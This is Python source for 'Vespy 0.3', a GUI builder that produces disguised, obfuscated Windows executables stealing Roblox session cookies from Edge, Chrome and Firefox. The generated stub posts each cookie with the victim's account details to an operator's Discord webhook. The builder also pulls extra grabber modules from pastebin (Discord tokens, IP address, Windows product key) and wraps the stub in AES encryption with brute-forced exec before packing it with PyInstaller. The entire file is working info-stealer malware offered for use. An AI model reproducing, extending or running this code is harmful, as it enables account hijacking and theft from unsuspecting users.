import os
from urllib.request import urlopen
import requests
import webbrowser
import random, msvcrt
import threading
import subprocess
import shutil
import win32gui
import win32console
from itertools import cycle
from time import sleep
from Crypto import Random
from Crypto.Cipher import AES
import os
import hashlib
from discord_webhook import DiscordWebhook, DiscordEmbed
import undetected_chromedriver as uc
from selenium import webdriver
from tkinter import messagebox
from tkinter import *
import getpass

USER_NAME = getpass.getuser()

os.system("mode con cols=60 lines=20")
os.system("title " + "Vespy 0.3 (Console)")
print("You Can Hide The Console In Settings")

window = Tk()
window.title("Vespy 0.3")
window.geometry("700x450")
window.maxsize(700, 450)
window.minsize(700, 450)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#F5F5F5')

bgimg = PhotoImage(file='assets/background.png')
buildbg = PhotoImage(file='assets/buildbg.png')
wlcbg = PhotoImage(file='assets/welcomebg.png')
aboutbg = PhotoImage(file='assets/aboutvespybg.png')
settingbg = PhotoImage(file='assets/settingbg.png')
dtool = PhotoImage(file='assets/dtoolsbg.png')
dsetup = PhotoImage(file='assets/dissetup.png')
massmsgbg = PhotoImage(file='assets/massdmmsg.png')
setupconbg = PhotoImage(file='assets/setupconbg.png')
nitrogenbg = PhotoImage(file='assets/nitrogenbg.png')
grpfinderbg = PhotoImage(file='assets/setupgrpfindbg.png')
setuplimsnipbg = PhotoImage(file='assets/setuplimsnipbg.png')
setupnitrosbg = PhotoImage(file='assets/setupnitrosnipebg.png')
setuptokengenbg = PhotoImage(file='assets/setuptokengenbg.png')
setuptradebg = PhotoImage(file='assets/setuptradebg.png')
setupdtools = PhotoImage(file='assets/setupdtools.png')
setuprtt = PhotoImage(file='assets/setuprtt.png')
setupfbot = PhotoImage(file='assets/setupfbot.png')
btoolstut = PhotoImage(file='assets/btoolstut.png')
missingwbh = PhotoImage(file='assets/missingwbh.png')
consolesetbg = PhotoImage(file='assets/consolesetup.png')
datasaved = PhotoImage(file='assets/datasaved.png')
compilerbg = PhotoImage(file='assets/compilerbg.png')
compilinglz = PhotoImage(file='assets/compilingexe.png')
img0 = PhotoImage(file='assets/img0.png')
img1 = PhotoImage(file='assets/img1.png')
img2 = PhotoImage(file='assets/img2.png')
img3 = PhotoImage(file='assets/img3.png')
nextbu = PhotoImage(file='assets/img4.png')
startbu = PhotoImage(file='assets/startbu.png')
ppbu = PhotoImage(file='assets/ppbu.png')
btcbu = PhotoImage(file='assets/btcbu.png')
backbu = PhotoImage(file='assets/backbu.png')
backbu2 = PhotoImage(file='assets/backbu2.png')
choosebu = PhotoImage(file='assets/choosebu.png')
disbu = PhotoImage(file='assets/disbu.png')
ytbbu = PhotoImage(file='assets/img5.png')
img0e = PhotoImage(file='assets/img0e.png')
img1e = PhotoImage(file='assets/img1e.png')
img2e = PhotoImage(file='assets/img2e.png')
img3e = PhotoImage(file='assets/img3e.png')
sw1 = PhotoImage(file='assets/offv.png')
sw2 = PhotoImage(file='assets/onv.png')

class Vespy:

    def getheaders(self, token=None, content_type="application/json"):
        try:
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        except:
            pass

    def __init__(self):
        self.bannername = ' '
        self.symbol = ''
        self.terminal = ''
        self.grabwebcam1 = ' '
        self.disgrabber1 = ' '
        self.grabwinprokey1 = ' '
        self.ipgrabberlol1 = ' '
        self.iswbcon = False
        self.iswpkon = False
        self.isgrabipon = False
        self.isgrabdison = False
        self.ishidecon = False
        self.everythingisokay = False
        self.start()

    def grabwebcam(self):
        messagebox.showerror('Vespy 0.3', 'Still Fixing Webcam Option !')

    def grabwinprokey(self):
        if self.iswpkon == False:
            self.iswpkon = True
            f = urlopen('https://pastebin.com/raw/1ffBeUP7')
            file = f.read()
            with open('woof2.dat', 'wb') as f:
                f.write(file)
            with open('woof2.dat', 'r+') as f:
                self.grabwinprokey1 = f.read()
            os.remove('woof2.dat')
            self.winpkbu.config(image=sw2)
        else:
            self.iswpkon = False
            self.grabwinprokey1 = ' '
            self.winpkbu.config(image=sw1)

    def ipgrabberlol(self):
        if self.isgrabipon == False:
            self.isgrabipon = True
            f = urlopen('https://pastebin.com/raw/5kD38fj4')
            file = f.read()
            with open('woof1.dat', 'wb') as f:
                f.write(file)
            with open('woof1.dat', 'r+') as f:
                self.ipgrabberlol1 = f.read()
            os.remove('woof1.dat')
            self.ipgrabbu.config(image=sw2)
        else:
            self.isgrabipon = False
            self.ipgrabberlol1 = ' '
            self.ipgrabbu.config(image=sw1)

    def disgrabber(self):
        if self.isgrabdison == False:
            self.isgrabdison = True
            f = urlopen('https://pastebin.com/raw/D58Ew5DU')
            file = f.read()
            with open('woof.dat', 'wb') as f:
                f.write(file)
            with open('woof.dat', 'r+') as f:
                self.disgrabber1 = f.read()
            os.remove('woof.dat')
            self.distokens.config(image=sw2)
        else:
            self.isgrabdison = False
            self.disgrabber1 = ' '
            self.distokens.config(image=sw1)

    def defaultselected(self):
        if self.setupdefaulton == False:
            self.setupdefaulton = True
            self.setupcustomon = False
            self.setupdefault.config(image=sw2)
            self.setupcustom.config(image=sw1)
        else:
            self.setupdefaulton = False
            self.setupdefault.config(image=sw1)

    def customselected(self):
        if self.setupcustomon == False:
            self.setupcustomon = True
            self.setupdefaulton = False
            self.setupdefault.config(image=sw1)
            self.setupcustom.config(image=sw2)
        else:
            self.setupcustomon = False
            self.setupcustom.config(image=sw1)
    
    def chooseiconon(self):
        if self.iconison == False:
            self.iconison = True
            self.iconon.config(image=sw2)
        else:
            self.iconison = False
            self.iconon.config(image=sw1)

    def choosenameon(self):
        if self.nameison == False:
            self.nameison = True
            self.nameon.config(image=sw2)
        else:
            self.nameison = False
            self.nameon.config(image=sw1)

    def checkingbrowsercookie3(self):
        cmd = 'pip show browser-cookie3'
        try:
            s1 = subprocess.check_output(cmd).decode('utf-8')
            self.verifybc3 = True
        except:
            print('Not installed')
            self.verifybc3 = False

    def checkingpyinstaller(self):
        cmd = 'pip show pyinstaller'
        try:
            s1 = subprocess.check_output(cmd).decode('utf-8')
            self.verifypyin = True
        except:
            print('Not installed')
            self.verifypyin = False
    
    def verifycv2path(self):
        if os.path.exists(f'C:\\Users\\{USER_NAME}\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\cv2'):
            self.verifypath = True
        else:
            self.verifypath = False

    def putthatshitexe(self):
        try:
            process = []
            if self.nameison == False:
                name = 'Default'
            else:
                name=self.zename.get()
            if self.iconison == True:
                icon = self.zeicon.get()
                cmd = f"""pyinstaller --onefile --name {name} --icon {icon} --hidden-import="browser_cookie3" --hidden-import="requests" --hidden-import="os" --hidden-import="re" --hidden-import="random" --hidden-import="string" --hidden-import="subprocess" --hidden-import="time" --hidden-import="colorama" --hidden-import="PIL" --hidden-import="PIL.Image" --hidden-import="PIL.ImageFont" --hidden-import="PIL.ImageDraw" --hidden-import="discord_webhook" --hidden-import="urllib.request" --hidden-import="getpass" --hidden-import="Crypto" --hidden-import="hashlib" --hidden-import="urllib3" v.py """
            else:
                cmd = f"""pyinstaller --onefile --name {name} --hidden-import="browser_cookie3" --hidden-import="requests" --hidden-import="os" --hidden-import="re" --hidden-import="random" --hidden-import="string" --hidden-import="subprocess" --hidden-import="time" --hidden-import="colorama" --hidden-import="PIL" --hidden-import="PIL.Image" --hidden-import="PIL.ImageFont" --hidden-import="PIL.ImageDraw" --hidden-import="discord_webhook" --hidden-import="urllib.request" --hidden-import="getpass" --hidden-import="Crypto" --hidden-import="hashlib" --hidden-import="urllib3" v.py """
            s1 = subprocess.Popen(cmd, shell=False)
            process.append(s1)
            for p in process:
                if p.wait() == 0:
                    mans = True
            if mans == True:
                sleep(5)
                try:
                    os.remove('v.py')
                except:pass
                try:
                    shutil.rmtree("__pycache__")
                except:pass
                try:
                    os.remove(f"{name}"+".spec")
                except:pass
                try:
                    shutil.rmtree('build')
                except:pass
            self.notorworking = True
        except:
            self.notorworking = False
        if self.notorworking == True:
            labelx6 = Label(window, text= 'Built Exe ! (In dist folder)',font=("SeoulHangang", '13', 'bold'),fg='#2AA100', bg='#C4C4C4')
            labelx6.place(x=232,y=200)
        else:
            try:
                os.remove('v.py')
            except:pass
            try:
                shutil.rmtree("__pycache__")
            except:pass
            try:
                os.remove(f"{name}"+".spec")
            except:pass
            try:
                shutil.rmtree('build')
            except:pass
            labelx6 = Label(window, text= "Error ! Make sure all requirements are installed",font=("SeoulHangang", '13', 'bold'),fg='#A10000', bg='#C4C4C4')
            labelx6.place(x=232,y=200)

    def beforeencrypt(self, key, file_name):
        self.plainkey = key
        self.keyuy = hashlib.sha256(key.encode('utf-8')).digest()
        self.file_name = file_name

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)
        
    def encrypt_file(self):
        with open(self.file_name, 'rb') as f:
            plaintext = f.read()
        enc = self.encrypt(plaintext, self.keyuy)
        with open(self.file_name, 'w') as f:
            f.write("from Crypto import Random\n")
            f.write("from Crypto.Cipher import AES\n")
            f.write("import hashlib\n")
            
            f.write("\nclass Decryptor:\n")
            f.write("\tdef __init__(self, key, file_name):\n")
            f.write("\t\tself.key = hashlib.sha256(key.encode('utf-8')).digest()\n")
            f.write("\t\tself.file_name = file_name\n\n")
            
            f.write("\tdef pad(self, s):\n")
            f.write("\t\treturn s + b\"\\0\" * (AES.block_size - len(s) % AES.block_size)\n\n")
            
            f.write("\tdef decrypt(self, ciphertext, key):\n")
            f.write("\t\tiv = ciphertext[:AES.block_size]\n")
            f.write("\t\tcipher = AES.new(key, AES.MODE_CBC, iv)\n")
            f.write("\t\tplaintext = cipher.decrypt(ciphertext[AES.block_size:])\n")
            f.write("\t\treturn plaintext.rstrip(b\"\\0\")\n\n")
            
            f.write("\tdef decrypt_file(self):\n")
            f.write("\t\tdec = self.decrypt(self.file_name, self.key)\n")
            f.write("\t\treturn dec\n\n")
            
            f.write("class BruteForce:\n")
            f.write("\tdef __init__(self, encrypted_codes):\n")
            f.write("\t\tself.encrypted_codes = encrypted_codes\n")
            f.write("\t\tself.password = 0\n\n")
            
            f.write("\tdef start(self): \n")
            f.write("\t\tstatus = True\n")
            f.write("\t\twhile status:\n")
            f.write("\t\t\ttry:\n")
            f.write("\t\t\t\tprint(f\"\\rPassword : {self.password}\", end=\"\")\n")       #Comment This Line      
            f.write("\t\t\t\ttest = Decryptor(str(self.password), self.encrypted_codes)\n")
            f.write("\t\t\t\tdecrypted_code = test.decrypt_file()\n")
            f.write("\t\t\t\texecutable = decrypted_code.decode() \n")
            f.write("\t\t\t\tstatus = False\n")
            f.write("\t\t\t\treturn executable \n")
            f.write("\t\t\texcept UnicodeDecodeError:\n")
            f.write("\t\t\t\tself.password += 1\n\n")
            
            f.write(f"encrypted_codes = {enc}\n")
            f.write(f"brute = BruteForce(encrypted_codes)\n")
            f.write(f"executable = brute.start()\n")
            f.write("exec(executable)\n")
            f.close()
            sleep(5)
            self.putthatshitexe()
           
    def encryptionlol(self):
        key = '1000'
        file_name = 'v.py'
        t= self.beforeencrypt(key, file_name)
        self.encrypt_file()

    def buildingpy(self):
        webhook = self.zewebhook.get()
        try:
            banner = self.bannername.get()
        except:
            banner = self.bannername
        try:
            symbol = self.symbol.get()
        except:
            symbol = self.symbol
        starty = fr"""
import browser_cookie3
import requests
import os
import re
import random, string
import subprocess
from os import system
from time import sleep
from colorama import Fore, init, Style, Back
from PIL import Image, ImageFont, ImageDraw
from discord_webhook import DiscordWebhook, DiscordEmbed
from urllib.request import Request, urlopen
import getpass

webhooky = "{webhook}"
tokytoky = True
USER_NAME = getpass.getuser()
Banner = "{banner}"
Symbol = '''{symbol}'''
system("mode con cols=70 lines=27")
        """
        cookie = r"""
try:
    ccookies = browser_cookie3.edge(domain_name='roblox.com')
    ccookies = str(ccookies)
    ccookie = ccookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":ccookie}).json()
    userid = userdata['id']
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":ccookie}).json()
    username = userdata['name']
    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":ccookie}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":ccookie}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    image_url = thumbnail["data"][0]["imageUrl"]
    content = '@everyone !'
    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)
    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')
    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
    embed.set_footer(text='vesper (c)')
    embed.set_timestamp()
    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)
    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)
    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)
    embed.add_embed_field(name="Cookie :", value=f"```{ccookie}```", ineline=False)
    embed.set_thumbnail(url=image_url)
    webhook.add_embed(embed)
    response = webhook.execute()
except:pass
try:
    cookies2 = browser_cookie3.chrome(domain_name='roblox.com')
    cookies2 = str(cookies2)
    cookie2 = cookies2.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie2}).json()
    userid = userdata['id']
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie2}).json()
    username = userdata['name']
    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie2}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie2}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    image_url = thumbnail["data"][0]["imageUrl"]
    content = '@everyone !'
    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)
    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')
    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
    embed.set_footer(text='vesper (c)')
    embed.set_timestamp()
    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)
    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)
    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)
    embed.add_embed_field(name="Cookie :", value=f"```{cookie2}```", ineline=False)
    embed.set_thumbnail(url=image_url)
    webhook.add_embed(embed)
    response = webhook.execute()
except:
    pass
try:
    cookies3 = browser_cookie3.firefox(domain_name='roblox.com')
    cookies3 = str(cookies3)
    cookie3 = cookies3.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie3}).json()
    userid = userdata['id']
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie3}).json()
    username = userdata['name']
    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie3}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie3}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    image_url = thumbnail["data"][0]["imageUrl"]
    content = '@everyone !'
    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)
    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')
    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
    embed.set_footer(text='vesper (c)')
    embed.set_timestamp()
    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)
    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)
    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)
    embed.add_embed_field(name="Cookie :", value=f"```{cookie3}```", ineline=False)
    embed.set_thumbnail(url=image_url)
    webhook.add_embed(embed)
    response = webhook.execute()
except:
    pass
sleep(0.2)
        
        """
        with open('v.py', 'w+') as f:
            f.write(fr"""
        {starty}
        {cookie}
        {self.disgrabber1}
        {self.ipgrabberlol1}
        {self.grabwinprokey1}
        {self.grabwebcam1}
        {self.terminal}
            """)
        sleep(2)
        self.encryptionlol()
    def idktbhuseless(self):
        labelx4 = Label(window, text= 'Building exe..',font=("SeoulHangang", '13', 'bold'),fg='#5200FF', bg='#C4C4C4')
        labelx4.place(x=232,y=180)

    def compilinglol(self):
        self.step3 = True
        self.step2 = True
        self.step1 = True
        self.verifypyin = None
        self.verifybc3 = None
        self.verifypath = None
        # very shitty and complicated thing
        zebg = Label(window,image=compilinglz, borderwidth=0)
        zebg.place(x=161,y=0)
        labelx = Label(window, text= 'Vespy is verifying if you have the requirements..',font=("SeoulHangang", '13', 'bold'),fg='#5200FF', bg='#C4C4C4')
        labelx.place(x=232,y=99)
        threading.Thread(target=self.checkingpyinstaller).start()
        while self.verifypyin == None:
            pass
        if self.verifypyin == True:
            labelx2 = Label(window, text= 'Pyinstaller is Installed !',font=("SeoulHangang", '13', 'bold'),fg='#2AA100', bg='#C4C4C4')
            labelx2.place(x=232,y=120)
            self.step1 = True
        else:
            labelx2 = Label(window, text= 'Pyinstaller Is not installed !',font=("SeoulHangang", '13', 'bold'),fg='#A10000', bg='#C4C4C4')
            labelx2.place(x=232,y=120)
            self.step1 = False
        if self.step1 == True:
            threading.Thread(target=self.checkingbrowsercookie3).start()
            while self.verifybc3 == None:
                pass
            if self.verifybc3 == True:
                labelx3 = Label(window, text= 'Browser-cookie3 is Installed !',font=("SeoulHangang", '13', 'bold'),fg='#2AA100', bg='#C4C4C4')
                labelx3.place(x=232,y=140)
                self.step2 = True
            else:
                labelx3 = Label(window, text= 'Browser-cookie3 Is not installed !',font=("SeoulHangang", '13', 'bold'),fg='#A10000', bg='#C4C4C4')
                labelx3.place(x=232,y=140)
                self.step2 = False
            if self.step2 == True:
                    messagebox.showinfo('Vespy 0.3', 'Everything is setup ! Click OK to Build.')
                    s1 = threading.Thread(target=self.idktbhuseless)
                    s2  =threading.Thread(target=self.buildingpy)
                    s1.start()
                    s2.start()

    def checkinfoofcompiler(self):
        hi = False
        webhook = self.zewebhook.get()
        while True:
            if webhook.startswith('https://discord.com/api/webhooks/'):
                pass
            else:
                messagebox.showerror('Vespy 0.3', 'Invalid Webhook')
                hi = False
                break
            if self.iconison == True:
                icon = self.zeicon.get()
                if icon.endswith('.ico'):
                    if os.path.exists(icon):
                        pass
                    else:
                        messagebox.showerror('Vespy 0.3', 'Make Sure To Put The .ico File In The Vespy Folder')
                        hi = False
                        break
                else:
                    messagebox.showerror('Vespy 0.3', 'The Icon Must Be a .ico file')
                    hi = False
                    break
            else:
                pass
            if self.nameison == True:
                name = self.zename.get()
                if len(name) > 0:
                    pass
                else:
                    messagebox.showerror('Vespy 0.3', 'Enter A Valid Name')
                    hi = False
                    break
            hi = True
            break
        if hi == True:
            a1 = threading.Thread(target=self.compilinglol)
            a1.start()
        else:
            self.compilerlol()

    def compilerlol(self):
        if self.everythingisokay == False:
            messagebox.showerror('Vespy 0.3', 'Please setup your stub before compiling.')
        else:
            self.iconison = False
            self.nameison = False
            self.builderbu = Button(window, image=img0,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.builda)
            self.builderbu.place(x=0,y=143)
            self.compilerbu = Button(window, image=img1,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.compilerlol)
            self.compilerbu.place(x=0,y=212)
            self.aboutbu = Button(window, image=img2,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.about)
            self.aboutbu.place(x=0,y=321)
            self.settingbu = Button(window, image=img3,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.settings)
            self.settingbu.place(x=0,y=388)
            self.compilerbu = Button(window, image=img1e,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.compilerlol)
            self.compilerbu.place(x=0,y=212)
            zebg = Label(window,image=compilerbg, borderwidth=0)
            zebg.place(x=161,y=0)
            self.zewebhook = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=35,borderwidth=0,show='*')
            self.zewebhook.place(x=335, y=102)
            self.zeicon = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=35,borderwidth=0)
            self.zeicon.place(x=335, y=196)
            self.zename = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=35,borderwidth=0)
            self.zename.place(x=335, y=313)
            self.iconon = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.chooseiconon)
            self.iconon.place(x=411,y=223)
            self.nameon = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosenameon)
            self.nameon.place(x=411,y=339)
            next = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.compilinglol)
            next.place(x=402,y=401)

    def dataissaved(self):
        zebg = Label(window,image=datasaved, borderwidth=0)
        zebg.place(x=161,y=0)
        self.everythingisokay = True

    def checkbanandsym(self):
        hi = True
        banner = self.bannername.get()
        symbol = self.symbol.get()
        while True:
            if len(banner) > 11:
                messagebox.showerror('Vespy 0.3', 'Too Many Characters')
                hi = False
                break
            elif len(banner) == 0:
                messagebox.showerror('Vespy 0.3', 'Please Enter Name Your Banner !')
                hi = False
                break
            else:
                pass
            if len(symbol) ==1:
                pass
            else:
                messagebox.showerror('Vespy 0.3', 'You can only type 1 symbol')
                hi = False
                break
            break
        if hi == True:
            self.dataissaved()
        else:
            self.bannerandsymbol()

    def bannerandsymbol(self):
        zebg = Label(window,image=consolesetbg, borderwidth=0)
        zebg.place(x=161,y=0)
        self.bannername = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=32,borderwidth=0)
        self.bannername.place(x=329, y=187)
        self.symbol = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=32,borderwidth=0)
        self.symbol.place(x=329, y=311)
        idkwhatthatis = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.checkbanandsym)
        idkwhatthatis.place(x=402,y=365)

    def choosefbot(self):
        f = urlopen('https://pastebin.com/raw/XzZkLVKj')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def followerbotlol(self):
        zebg = Label(window,image=setupfbot, borderwidth=0)
        zebg.place(x=161,y=0)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.raidtoolol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosefbot)
        chosebu.place(x=406,y=359)

    def choosertt(self):
        f = urlopen('https://pastebin.com/raw/zUX5dpQK')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def raidtoolol(self):
        zebg = Label(window,image=setuprtt, borderwidth=0)
        zebg.place(x=161,y=0)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.followerbotlol)
        nextlol.place(x=610,y=392)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.dtoolslol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosertt)
        chosebu.place(x=406,y=359)

    def choosedtools(self):
        f = urlopen('https://pastebin.com/raw/98fskDLL')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def dtoolslol(self):
        zebg = Label(window,image=setupdtools, borderwidth=0)
        zebg.place(x=161,y=0)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.raidtoolol)
        nextlol.place(x=610,y=392)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.tradebotlol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosedtools)
        chosebu.place(x=406,y=359)

    def choosetradebot(self):
        f = urlopen('https://pastebin.com/raw/ZDsK3zkx')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def tradebotlol(self):
        zebg = Label(window,image=setuptradebg, borderwidth=0)
        zebg.place(x=161,y=0)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.dtoolslol)
        nextlol.place(x=610,y=392)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.tokengenlol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosetradebot)
        chosebu.place(x=406,y=359)

    def choosetokengen(self):
        f = urlopen('https://pastebin.com/raw/jCKcnaBr')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def tokengenlol(self):
        zebg = Label(window,image=setuptokengenbg, borderwidth=0)
        zebg.place(x=161,y=0)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.tradebotlol)
        nextlol.place(x=610,y=392)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.nitrosnipelol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosetokengen)
        chosebu.place(x=406,y=359)

    def nitrosnipez(self):
        f = urlopen('https://pastebin.com/raw/Fv90GpVx')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def nitrosnipelol(self):
        zebg = Label(window,image=setupnitrosbg, borderwidth=0)
        zebg.place(x=161,y=0)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.tokengenlol)
        nextlol.place(x=610,y=392)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.limsnipelol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.nitrosnipez)
        chosebu.place(x=406,y=359)

    def chooselimsnip(self):
        f = urlopen('https://pastebin.com/raw/sX3AiAvL')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def limsnipelol(self):
        zebg = Label(window,image=setuplimsnipbg, borderwidth=0)
        zebg.place(x=161,y=0)
